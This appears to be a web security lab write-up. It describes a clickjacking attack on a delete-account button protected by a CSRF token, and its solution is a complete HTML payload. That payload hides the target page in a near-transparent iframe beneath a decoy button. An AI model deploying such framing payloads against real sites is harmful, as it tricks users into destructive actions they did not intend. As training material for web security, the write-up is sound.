# Basic clickjacking with CSRF token protection

## Task

This lab contains login functionality and a delete account button that is protected by a CSRF token. The goal of the lab is to entice the use into deleting their account.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The account is solved when the account is deleted.

You have an account on the application that you can use to help design your attack. The credentials are: carlos / montoya.
Note

The victim will be using Chrome so test your exploit on that browser.


## Solution

```xml
<html>
<head>
  <style>
    #target_website {
      position: relative;
      width: 278px;
      height: 326px;
      opacity: 0.00000001;
      z-index: 2;
      top: -297px;
      left: -20px;
    }

    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
   <button>Just click this button!</button>
  </div>
  <iframe id="target_website" src="https://acd01fcf1faf8e7f803a13ae00ed0095.web-security-academy.net/account">
  </iframe>
</body>

</html>
```